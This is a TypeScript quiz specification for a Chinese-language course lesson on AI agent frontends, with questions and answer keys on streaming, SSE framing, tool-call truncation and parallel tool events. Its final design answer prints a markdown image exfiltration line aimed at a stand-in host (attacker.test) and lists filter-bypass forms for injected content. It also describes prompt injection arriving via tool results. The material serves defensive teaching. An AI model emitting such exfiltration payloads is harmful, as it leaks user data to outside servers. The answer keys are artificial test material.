import type { QuizSpec } from '@/lib/quiz'

export const quiz: QuizSpec = {
  lessonId: 'L16',
  questions: [
    {
      id: 'reset-step',
      kind: 'choice',
      prompt:
        '你的 agent 前端把流式 chunk 累积成消息列表，遇到不认识的 chunk 类型就静默忽略——这一点你是照着协议文档做的，它明确要求优雅处理未知类型。上线后收到反馈：模型的回答偶尔会"重复半句话再重新说一遍"，但后端日志里这些请求全部 200，没有任何异常。最可能的原因是什么？',
      options: [
        {
          id: 'a',
          label: '模型本身在某些 prompt 下会重复。应该调低 temperature 或改 prompt',
        },
        {
          id: 'b',
          label: 'SSE 分帧写错了，某些 chunk 被解析了两次',
        },
        {
          id: 'c',
          label:
            '协议里有一个 `reset-step` chunk 要求撤回当前 step 的全部 part，而"静默忽略未知类型"把它一起忽略了',
        },
        {
          id: 'd',
          label: 'React 的 StrictMode 在开发模式下双调用了 reducer，生产环境不会出现',
        },
      ],
      correct: ['c'],
      explain: `C。

这是一个藏得很深的 bug，因为**你做对了一件事，却因此漏掉了另一件事**。

"遇到未知类型静默忽略"是协议明确要求的，而且有真实教训——OpenAI 在 chunk 里加了一个 \`obfuscation\` 字段之后，做严格校验的客户端直接挂了。所以这条本能是对的。

问题在于 \`reset-step\` **不是未知类型，是你没实现的已知类型**：

> "\`reset-step\` — Removes all message parts added during the current step."
>
> —— Vercel AI SDK 线协议，\`ai@7.0.101\` 源码注释

它的用途正是「某一步重试了，失败那次的部分输出必须在替换输出到达之前失效」。服务端为什么不能用状态码报这件事？因为 HTTP 头在第一个 token 之前就发出去了——这是 L02 留下的那张欠条。

于是现象就是题干描述的样子：

    只会 append 的前端：
      我去读一下 config.ts，端口应该写在第 4我去读一下 config.ts，端口写在第 42 行，是硬编码的。
    
    正确撤回的前端：
      我去读一下 config.ts，端口写在第 42 行，是硬编码的。

**A 是最危险的选项**，因为它会让你花一周去调 prompt。而且它有一定的表面合理性——重复确实是模型的一种失败模式。区分方法很简单：让服务端把原始 chunk 流 dump 出来，看里面有没有 \`reset-step\`。

B 可以排除：分帧错误的典型症状是解析崩溃或者事件丢失，不是内容重复——重复要求同一段内容被**发送**了两次，而这正是服务端重试做的事。

D 可以排除：StrictMode 双调用打的是 effect 和 render，而且如果你的 reducer 是纯函数（它应该是），双调用不产生可见差异。

**这一节的中心论点就在这里**：agent 前端的核心数据结构不是消息列表，是一个带撤销点的、可回滚的渲染缓冲区。一个只会 append 的前端，在协议层面就是不合规的。`,
    },

    {
      id: 'blank-line',
      kind: 'choice',
      prompt:
        '你在自己的服务端把上游的 SSE 流转发给浏览器，转发逻辑是 `buf.indexOf("\\n\\n")` 切帧。本地开发一切正常，流式效果很顺。上线到生产环境后，用户反馈"要转圈十几秒然后整段文字一次蹦出来"，而你的日志显示这些请求都是成功的流式响应，耗时也和本地差不多。最可能的原因是什么？',
      options: [
        { id: 'a', label: '生产环境的 CDN 开了 gzip，压缩需要攒够一个块才能发出' },
        {
          id: 'b',
          label:
            '中间层把行结束符改写成了 CRLF 或 CR。SSE 的「空行」有八种字节组合，`indexOf("\\n\\n")` 只认其中一种',
        },
        { id: 'c', label: 'AWS ALB 默认开启 response buffering，需要在属性里关掉' },
        { id: 'd', label: '浏览器对同一域名有 6 个并发连接的限制，流被排队了' },
      ],
      correct: ['b'],
      explain: `B。

SSE 的帧边界是一个**空行**，而规范允许三种行结束符任意混用：

> "Lines must be separated by either a U+000D CARRIAGE RETURN U+000A LINE FEED (CRLF) character pair, a single U+000A LINE FEED (LF) character, or a single U+000D CARRIAGE RETURN (CR) character."
>
> —— WHATWG HTML Standard, *Server-sent events § Parsing an event stream*

「两个连续的行结束符」于是有八种可分辨的写法。lab 的实验一逐个试过：

    空行写法         只认 \\n\\n    按行切
    CRLF+CRLF                0         5
    CRLF+LF                  5         5   ← 碰巧对
    CRLF+CR                  0         5
    LF+CRLF                  0         5
    LF+LF                    5         5   ← 对
    LF+CR                    0         5
    CR+CRLF                  0         5
    CR+CR                    0         5

注意**失败的方式**：不是抛异常，是切出 0 帧——转发器手上攒着整条流，直到流结束才一次吐出去。所以你的"流式接口"能用，只是一点都不流。而在日志里这是一次成功的流式响应，耗时正常。

**为什么本地测不出来**：本地的服务端和浏览器之间没有那个会改写行结束符的中间层。

而 \`CRLF+LF\` 那一行尤其讨厌——\`\\r\\n\\n\` 的尾部恰好含有一个 \`\\n\\n\`，位置也刚好对。**这种"碰巧对"比全错更危险**，它让你在本地测通之后认定实现没问题。

**A 是一个真实存在的问题，但症状不同**：gzip 不支持流式会把整个 body 缓冲在内存里，Cloudflare 的维护者在 issue 里写明过这件事。但那会让**首字节**也延迟，而题干说日志耗时正常——说明字节是按时流过服务端的，问题出在切帧。

**C 是一条流传很广但错误的说法**，这一节专门纠正了它：AWS 官方文档里**没有** ALB 的 response buffering 属性。ALB 上 SSE 的真实风险是空闲超时（\`idle_timeout.timeout_seconds\`，默认 60 秒），不是缓冲。按错的诊断去修，你会加一堆没用的响应头然后继续断线。

D 可以排除：连接排队会让某些流**完全不开始**，不是开始了但不流。`,
    },

    {
      id: 'max-tokens',
      kind: 'choice',
      prompt:
        '你的审批界面收到一个工具调用，累积到的参数字符串是 `{"path":"src/config.ts","replace":"const PORT = 80`。这次请求 HTTP 200，流正常结束，没有 `error` 事件，`stop_reason` 是 `max_tokens`。下面哪个处理是对的？',
      options: [
        {
          id: 'a',
          label: '补上 `"}` 让它成为合法 JSON，然后正常走审批流程让用户决定',
        },
        {
          id: 'b',
          label: '当成非法 JSON，包成 `{"INVALID_JSON": "..."}` 回传给模型让它重试',
        },
        {
          id: 'c',
          label: '撤回这个工具调用，提高 `max_tokens` 重发请求',
        },
        {
          id: 'd',
          label: '按参数不完整处理，向用户展示已知的 `path` 字段并询问缺失的 `replace` 值',
        },
      ],
      correct: ['c'],
      explain: `C。

官方对这条路径有明文，而且方向很明确：

> "A response that ends with the stop reason \`max_tokens\` can also cut a parameter off midway."
>
> "Check the stop reason and decide whether to retry the request with a higher \`max_tokens\` or repair the partial input."
>
> "you'll need to retry the request with a higher \`max_tokens\` value to get the full tool use"
>
> —— Anthropic, *Tool use § Streaming tool use*

**A 是最糟的选择**，而它恰好是最自然的念头。补上 \`"}\` 之后语法确实合法了，你得到一个可以执行的参数——它要把端口改成 \`80\`。

而模型想写的可能是 \`8080\`、\`process.env.PORT\`、或者一整段代码。**你不知道，因为被切掉的恰恰是你需要的那部分信息。** 补全一个被截断的参数，等于替模型猜它想干什么，而这个动作的下游是一次真实的文件写入。

注意"走审批流程让用户决定"也救不了 A：用户看到的是一个语法完整、看起来合理的参数，他没有任何线索知道它被截断过。**你把不确定性洗掉了。**

**B 的方向是反的。** \`INVALID_JSON\` 回传是给"模型吐了一串真的不合法的东西"用的——让它自己看见自己写了什么然后改。但这里模型写的东西**本来是对的**，是被 \`max_tokens\` 切断的。回传给它看只会浪费一轮，而且它会困惑于自己明明写对了。

这就是为什么参数状态必须是**四态**而不是两态：

| 状态 | 含义 | 正确动作 |
|---|---|---|
| \`streaming\` | 还没收到 stop | 可以展示，不可执行 |
| \`ready\` | 收完且合法 | 可执行 |
| \`invalid\` | 收完但不合法 | 包成 \`INVALID_JSON\` 回传 |
| \`truncated\` | 被 \`max_tokens\` 切断 | 撤回 + 提高 \`max_tokens\` 重试 |

后两个的处理**方向相反**。一个只有「合法 / 非法」的实现会把 \`truncated\` 归进 \`invalid\`，于是走上 B 那条路。

**D 的问题更微妙**：向模型或用户索要缺失的字段，前提是你知道"缺了什么"。但你不知道——\`replace\` 这个键已经出现了，值也开始写了。被截断的位置在**值的中间**，所以"缺失的字段"这个描述本身就不成立。

最后一点值得记住：**这条路上没有任何错误信号。** HTTP 200、流正常结束、没有 error 事件、\`stop_reason\` 甚至不是个"错误"。这是 \`reset-step\` 之外第二条通往撤回的路径，而它更容易漏。`,
    },

    {
      id: 'unmount',
      kind: 'choice',
      prompt:
        '你的 agent 界面里，`useEffect` 的清理函数会 abort 在途的生成请求——这是你写 React 多年的标准做法，用来避免竞态和内存泄漏。用户开始反馈"任务跑到一半自己停了"。他们的共同行为是：发起任务后切到别的 tab 或别的页面去做事。正确的修法是什么？',
      options: [
        {
          id: 'a',
          label: '在清理函数里加一个延迟，给流几秒钟时间自己完成',
        },
        {
          id: 'b',
          label:
            '把「取消渲染」和「取消生成」拆成两个信号。卸载和页面关闭只做前者，停止生成只认用户那一次显式点击',
        },
        {
          id: 'c',
          label: '把生成请求提到全局单例里，这样组件卸载就不会触发清理',
        },
        {
          id: 'd',
          label: '用 `beforeunload` 拦住页面关闭，提示用户等任务完成',
        },
      ],
      correct: ['b'],
      explain: `B。

官方对这件事有非常明确、而且反直觉的规定：

> "Do not call the stop endpoint from route cleanup code."
>
> "page unloads … should remain resumable"

也就是说：**组件卸载、路由切换、页面关闭都不应该停止生成。** 那些流要保持可恢复。

**这条和一个 React 的本能正面冲突。** \`useEffect\` 清理里 abort 在途请求是教科书写法，理由完全正当——避免 setState-after-unmount、避免竞态。在普通应用里它是对的，因为那个请求没有副作用、没有成本、重发一次也不贵。

在 agent 前端里，同一个写法会把用户花了钱的生成给掐掉，而且掐在他切了个 tab 的时候。

所以答案是**语义上的拆分**，不是时序上的补丁：

    /** 组件卸载 / 路由切换。★ 什么都不做。 */
    onUnmount(): void {}
    
    /** 页面 unload。★ 什么都不做——那条流要保持可恢复。 */
    onPageHide(): void {}
    
    /** 用户显式点了停止。★ 幂等：连点三次也只发一次。 */
    onUserStop(): void { /* ... */ }

这个类三个方法里有**两个必须什么都不做**——这就是它存在的理由。而 verify 里对应的两条断言（E-01、E-02）是「断言你什么都没做」，这种测试形式不常见，但在这里必要，因为要防的恰恰是一个"正确的"本能。

**A 是一个典型的"用时序掩盖语义错误"**。几秒钟是多少？agent 任务可以跑几分钟。而且延迟之后你仍然会 abort，只是时间点更随机——从"总是断"变成"有时断"，更难查。

**C 解决了症状但留下了根因**：全局单例确实不会随组件卸载，但你仍然没有区分两种取消。等哪天要做"用户点停止"时，你会发现手上只有一个 abort 通道，于是又要拆一次。而且这次拆要在一个已经有状态的单例里做。

D 的问题是它**把工程约束转移给了用户**。让人守着页面等 agent 干完活，恰好否定了后台 agent 存在的理由。

**顺带两件相关的事**：

1. 点了停止，钱已经花了——"you will be billed for any tokens generated before the cancellation"。停止按钮不是"撤销"，是"止损"，而你的成本账要把这部分算进去（接 L15）。

2. 中断之后管线里还有在路上的 delta。所以 \`abort\` 必须是**终态**——否则你会在用户按下停止之后还往屏幕上写字。`,
    },

    {
      id: 'typewriter',
      kind: 'choice',
      prompt:
        '你要在 agent 界面里加打字机效果。同事说"打字机让等待更可忍受，行业标配"，让你把速率设成一个好看的值。基于有一手依据的研究，下面哪个说法是准确的？',
      options: [
        {
          id: 'a',
          label: '流式逐字显示已被厂商 A/B 数据证明能提升满意度，速率取 20–40 cps 最优',
        },
        {
          id: 'b',
          label:
            '流式已证实的收益是降低首次反馈时间；而慢速逐字显示有降低阅读理解的一手证据，且「最优速率」查不到依据',
        },
        {
          id: 'c',
          label: '打字机效果对体验无影响，纯属视觉偏好，可以随意设置',
        },
        {
          id: 'd',
          label: '按 Nielsen 的 0.1/1/10 秒阈值，只要首字在 1 秒内出现，后续速率不重要',
        },
      ],
      correct: ['b'],
      explain: `B。

这一节对打字机的结论是：**代价可测，收益无据。** 两条都要如实说。

**代价一是纯算术**——内容已经到手了，打字机还让用户接着等：

    一个 2000 字符的回答，流在 8 秒内全部到达客户端。
    
    渲染速率                  显示完成      白等  DOM 更新次数
    15 cps（慢速打字机）          133s      +125s          2000
    30 cps                         67s       +59s          2000
    到多少显多少（不节流）          8s         0s           480

**代价二有一手实验依据**：

> "Slow, character-by-character displays degraded reading comprehension…"
>
> —— Tombaugh, Arkin & Dillion, *The Effect of VDU Text-Presentation Rate on Reading Comprehension and Reading Speed*, CHI 1985

理解率在 **30 cps 和瞬间全显时最高，15 cps 最差**。所以 15 cps 是最坏的组合：白等 125 秒、DOM 更新 2000 次、而且更难读。

**A 错在两处，而且两处都是"找过但找不到"**：

第一，**没有任何厂商的 A/B 数据表明流式输出改善用户满意度。** OpenAI、Anthropic、Google、Vercel、Cursor 的官方文档、博客、changelog 里都没有。

第二，「20–40 cps 最优」找不到任何一手实验依据。Tombaugh 只能支持「太慢有害」这个方向，**不能反推最优速率**。

所以这一节不给 cps 数字。这不是偷懒，是**这个数字目前没有人有资格给**。

**C 错在把"无证据"当成"无影响"。** 代价那一侧是有证据的——Tombaugh 的理解率数据，以及那张白等表。Anthropic 自己也建议渲染前先缓冲几个 token，理由是避免过多的 DOM 更新（注意这是为了**性能**，不是为了好看）。

**D 有两个错。** 首先那三个数字不是 Nielsen 引用 Miller 得来的，而是 Nielsen 1993 自己的综合——Miller 1968 的原始数字是 0.1 / 2 / 15 秒，而且每一条对应不同的具体场景，不是一张通用阈值表。

其次，agent 的响应时间**远远超出**这两套阈值的全部范围。Miller 那张表里唯一能用在 agent 上的是最后一行：

> "Delays of up to a minute or more may be tolerable **if the user has been informed**."

这是整张表里唯一附了条件的一条。**这个领域唯一能直接套用在 agent 上的经典结论，内容是「你必须告知用户」，而不是任何一个具体秒数。**

而"后续速率不重要"直接被上面那张白等表否掉了：首字 0.8 秒出现、然后用 133 秒把内容挤出来，体验不会因为 TTFT 达标而变好。`,
    },

    {
      id: 'interleave',
      kind: 'debug',
      prompt:
        '下面这个并行工具调用的累积器有**两个** bug，而它们的共同点是：在你的开发环境里几乎撞不到。找出来，说明各自在什么真实场景下触发，以及为什么单元测试很可能漏掉它们。提示：想一想「同时调用两个工具」和「一条流对应一个模型」这两件事。',
      lang: 'ts',
      code: `interface ToolCall {
  itemId: string
  toolName: string
  raw: string
  done: boolean
}

/** 把原始工具事件累积成工具调用列表。 */
function accumulate(events: RawToolEvent[]): ToolCall[] {
  const calls: ToolCall[] = []
  let current: ToolCall | null = null

  for (const e of events) {
    if (e.phase === 'start') {
      current = { itemId: e.itemId, toolName: e.toolName ?? '', raw: '', done: false }
      calls.push(current)
    } else if (e.phase === 'delta') {
      // 追加到正在进行的那个调用上
      if (current) current.raw += e.delta ?? ''
    } else if (e.phase === 'stop') {
      if (current) current.done = true
      current = null
    }
  }

  return calls
}`,
      rubric: [
        '你有没有注意到 `current` 这个游标假设了「事件不交错」？并行工具调用的 delta 是交替到达的。',
        '你有没有发现归位要靠 `itemId` / `output_index`，而排序要靠全局 `seq`（乱序到达是真实存在的）？',
        '你有没有想到「只有 start 和 stop、一条 delta 都没有」的块不是工具调用？',
        '你能说出这两个 bug 为什么都**不抛异常**，以及各自的可见症状是什么吗？',
        '你能解释为什么这两个 bug 在只有一个工具调用时完全不可见吗？这是这道题真正要问的。',
      ],
      reference: `两个 bug 都不抛异常、都不进日志，而且**都在只有一个工具调用时完全不可见**。

## Bug 1：\`current\` 这个变量假设了事件不交错

    let current: ToolCall | null = null
    // ...
    if (current) current.raw += e.delta ?? ''

并行工具调用的事件**会交错**：A 的一片、B 的一片、A 的一片……

    seq 1  itemId=a  start  (read)
    seq 2  itemId=b  start  (write)
    seq 3  itemId=a  delta  '{"path":"'
    seq 4  itemId=b  delta  '{"path":"'
    seq 5  itemId=a  delta  'A.ts"}'
    seq 6  itemId=b  delta  'B.ts"}'

这段输入喂进去，\`current\` 在 seq 2 之后就指向 B 了，于是 A 的两片 delta 全部拼到 B 上：

    A.raw = ''                              ← 空的
    B.raw = '{"path":"{"path":"A.ts"}B.ts"}' ← 串味

**注意这个 bug 的症状**：不是崩溃，是两个工具都拿到内容串味的参数。运气不好的时候拼出来的东西**语法还是合法的**，于是 agent 去读了一个它没打算读的文件——而日志全绿。

正确做法是按 \`itemId\` / \`output_index\` 归位，用一个 map 而不是一个游标。另外排序要靠全局 \`seq\`：乱序到达是真实存在的（OpenAI 的事件带 \`sequence_number\` 正是为了这个）。

## Bug 2：零 delta 的块被当成了工具调用

    if (e.phase === 'start') {
      current = { itemId: e.itemId, toolName: e.toolName ?? '', raw: '', done: false }
      calls.push(current)   // ← 无条件推进列表
    }

Anthropic 的流可以在服务端**中途换模型**，而每个模型边界会插入一个只有 start 和 stop、中间一条 delta 都没有的空块：

> "during server-side fallback responses, a fallback content block arrives at each model boundary as a \`content_block_start\` and \`content_block_stop\` pair with no deltas in between"

于是界面上多出一张卡片：名字是空串（\`e.toolName ?? ''\`），参数是空的。

而它**不是**一个工具调用——它是一个信号，告诉你"下面这段是另一个模型写的"。也就是说这个 bug 不只是多渲染了一张卡片，是**丢掉了一条你本该展示给用户的信息**。

## 为什么单元测试会漏掉这两个

这是这道题真正要问的。

**Bug 1** 漏掉的原因：你写测试时会构造一个工具调用的事件序列，因为那是最自然的用例。而这个 bug 在单调用时**完全正确**——\`current\` 游标在只有一个调用时就是对的。

所以 verify 里 D-04 那条断言专门测**单个**工具调用，它的存在意义是防止你写出一个"单调用特例分支"，让并行路径成为一条从没跑过的代码。而 D-01（完全交错）是这一组里最重要的单条测试。

**Bug 2** 漏掉的原因更简单：**你没法让它发生。** 服务端中途换模型是罕见事件，你没有开关能触发它。

这就是为什么 lab 的事件流是**脚本化的假流**而不是真实调用——服务端换模型、\`max_tokens\` 恰好切在参数中间、CDN 重新分帧、流跑到一半失败重试，这四件事在真实调用里几乎撞不到。用确定性的假流，它们每次都能复现。

**这里有一条方法论值得单独记住**：「不可自动断言」和「不可重复」是两件事，后者才是真的麻烦。打字机的观感只能肉眼验收，但它至少可以**重复**地看；而一个你没法触发的分支，连看都看不到。`,
    },

    {
      id: 'render-untrusted',
      kind: 'design',
      prompt:
        '你要设计 agent 界面渲染模型输出的安全规格。它要处理三类内容：模型生成的 markdown、工具返回的结果（文件内容、网页、第三方 API）、以及模型选择渲染的 UI 组件及其参数。写出你的规格并解释取舍——重点是你**拒绝**做什么，以及为什么。',
      scenario:
        '现状：界面直接把模型输出交给一个 markdown 渲染器，允许内联 HTML，因为产品要支持表格和代码块。安全同学提了一个工单，内容是一张截图：一段回答在界面上什么都没多显示，但 devtools 的 Network 里有一个发往外部域名的图片请求，query string 是一串 base64。团队里有人提议"加一个正则过滤掉可疑域名就行"。',
      reference: `这题没有唯一答案，但有几个能区分"想过"和"没想过"的点。

## 一、先把威胁模型说对：渲染即发送

工单里那张截图的关键不是"有个奇怪的请求"，是**不需要用户点击**。

    ![](https://attacker.test/p?d=QUtJQTEyMzQ1Njc4OTA)

这个图片宽 0 高 0，界面上什么都不显示。但浏览器已经把 query string 里的数据发出去了。

**它和普通 XSS 的区别**：没有脚本执行，没有告警，只是一个加载失败的图片。而它长得像一个正常的 UI 元素。

所以第一条规格：**审计发生在渲染之前，而不是渲染之后再隐藏。** "渲染出来再用 CSS 藏起来"不是防御——请求已经发出去了。

## 二、"加个正则过滤可疑域名"为什么不行

这是题干里那个提议，它有三层问题，从浅到深：

**第一层：黑名单在这个问题上没有意义。** 攻击者控制域名，你永远在追。

**第二层：只匹配一种 markdown 写法会被绕过。** 至少三种形式都能发起请求：

    ![](url)                      内联式
    ![t][ref] + [ref]: url        参考式
    <img src=url>                 内联 HTML

**漏掉参考式的过滤器被真实绕过过。** L14 那张表里五个厂商的过滤全被绕过过，包括一个带 HMAC 签名的图片代理。

**第三层，也是最值得说的：有一处顺序写错就变成"安全剧场"。**

    // ★★ 这一条必须排在「相对路径」判断之前
    if (u.startsWith('//')) return true
    
    // 锚点、站内路径、data: 不产生外部请求
    if (/^(#|\\/|\\.|data:)/.test(u)) return false

\`//attacker.test/x\` 是**协议相对 URL**，浏览器会照常发出去。而一个「以 \`/\` 开头就是站内路径」的判断会直接放过它。

把这两个 \`if\` 换个顺序，函数从"安全检查"变成"安全剧场"——而单元测试如果只测了 \`https://\` 开头的 URL，是发现不了的。

所以规格里要写：**白名单，而且解析不出来的算违规。** 「看不懂所以放过」是这门课反复出现的那个错。

## 三、三类内容必须走同一条路径（这是最容易漏的一条）

题干把内容分成三类，而一个很自然的设计是只清理第一类——"模型说的话"不可信，工具结果是"我们自己系统返回的"。

**这是错的。** 工具结果同样来自外部：文件内容是用户仓库里的、网页是互联网上的、第三方 API 是别人的服务器。L14 讲的注入正是从那里进来的。

所以规格：**清理函数对三类内容一视同仁**，而且这件事要有断言保证（verify 的 F-07 专门测工具结果走同一条路径）。

一个实现上的建议：不要让"要不要清理"成为调用方的选择。把清理放在数据进入渲染层的**唯一入口**上，而不是放在每个组件里。理由和 \`buildResumeRequest\` 不接受过滤器参数是同一个——**不提供某个能力，本身是一种正确性保证。**

## 四、第三类内容的规格其实最简单

"模型选择渲染的 UI 组件及其参数"这一类，规格是：**组件由你预先注册，模型只能选择和传参。**

这不是保守，它解决的正是前三节那个问题：如果模型能生成渲染代码，上面那套审计**根本没法做**——你没法审计一段你还没见过的代码会发出什么请求。

所以生成式 UI 的实际形状是：**决策权在模型，渲染权在你。** 主流协议里没有一个让模型输出 JSX。

## 五、要拒绝做什么

一份好的规格里应该有明确的"不做"清单：

- **不做黑名单。** 理由见第二节。
- **不做"渲染后隐藏"。** 渲染即发送。
- **不做"可疑内容提示用户确认"。** 用户没有能力判断一个 base64 query string 是什么，而这个提示会训练他无脑点确认——和审批 UI 的失效方式一样。
- **不允许模型生成渲染代码。** 见第四节。
- **不自己写 HTML 消毒器。** 如果产品真的需要内联 HTML，用成熟的库（DOMPurify 之类）。课程里那个 \`sanitizeInline\` 只堵两个具体的、有真实案例的洞（危险 scheme、事件处理器属性），它**不是**一个消毒器，而且注释里写明了这一点。

## 六、一件必须承认的事

我在调研里专门找过「LLM 输出渲染安全要求」的规范文档——厂商的、标准组织的，都找过。

**没有。**

所以上面这套规格是从一手事实推导的，不是引用来的。这件事应该写进你的规格文档里，因为它意味着：**这个问题现在归你自己想清楚，而且你想不清楚的话，没有一份文档会替你兜住。**

一个真实的行业空白，比一个你以为存在的标准更值得知道。`,
    },
  ],
}
